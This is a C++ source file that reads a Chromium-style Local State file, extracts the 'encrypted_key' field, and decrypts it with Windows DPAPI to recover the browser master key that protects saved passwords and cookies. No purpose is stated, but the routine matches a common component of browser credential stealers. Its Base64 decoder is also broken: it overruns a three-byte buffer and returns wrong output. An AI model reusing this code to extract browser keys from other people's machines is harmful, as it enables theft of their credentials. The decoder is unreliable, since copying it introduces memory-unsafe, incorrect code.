#include "dpapi.h"
#include <Windows.h>
#include <dpapi.h>
#include <fstream>
#include <sstream>
#include <regex>
#include <iostream>

#pragma comment(lib, "crypt32.lib")

std::vector<uint8_t> DPAPI::Decrypt(const uint8_t* encryptedData, size_t dataLen) {
    std::vector<uint8_t> result;
    
    DATA_BLOB dataIn;
    DATA_BLOB dataOut;
    
    dataIn.pbData = (BYTE*)encryptedData;
    dataIn.cbData = (DWORD)dataLen;
    
    if (CryptUnprotectData(&dataIn, NULL, NULL, NULL, NULL, 0, &dataOut)) {
        result.assign(dataOut.pbData, dataOut.pbData + dataOut.cbData);
        LocalFree(dataOut.pbData);
    }
    
    return result;
}

std::string DPAPI::ExtractMasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        return "";
    }
    
    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string jsonContent = buffer.str();
    file.close();
    
    std::regex pattern("\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"");
    std::smatch match;
    
    if (std::regex_search(jsonContent, match, pattern) && match.size() > 1) {
        std::string encryptedKey = match[1].str();
        std::vector<uint8_t> decoded = Base64Decode(encryptedKey);
        
        if (decoded.size() >= 5) {
            std::string prefix(decoded.begin(), decoded.begin() + 5);
            if (prefix == "DPAPI") {
                decoded.erase(decoded.begin(), decoded.begin() + 5);
                
                std::vector<uint8_t> decrypted = Decrypt(decoded.data(), decoded.size());
                
                if (!decrypted.empty()) {
                    std::string masterKey(decrypted.begin(), decrypted.end());
                    return masterKey;
                }
            }
        }
    }
    
    return "";
}

std::vector<uint8_t> DPAPI::Base64Decode(const std::string& input) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::vector<uint8_t> result;
    int i = 0, j = 0, pad = 0;
    char decoded[3];
    
    for (size_t idx = 0; idx < input.size(); idx++) {
        if (input[idx] == '=') {
            pad++;
            continue;
        }
        
        char c = input[idx];
        int val = base64_chars.find(c);
        if (val == std::string::npos) continue;
        
        switch (i % 4) {
            case 0:
                decoded[j] = val << 2;
                break;
            case 1:
                decoded[j++] |= val >> 4;
                decoded[j] = (val & 0x0F) << 4;
                break;
            case 2:
                decoded[j++] |= val >> 2;
                decoded[j] = (val & 0x03) << 6;
                break;
            case 3:
                decoded[j++] |= val;
                break;
        }
        i++;
    }
    
    if (j > 0) {
        result.assign(decoded, decoded + j);
    }
    
    return result;
}
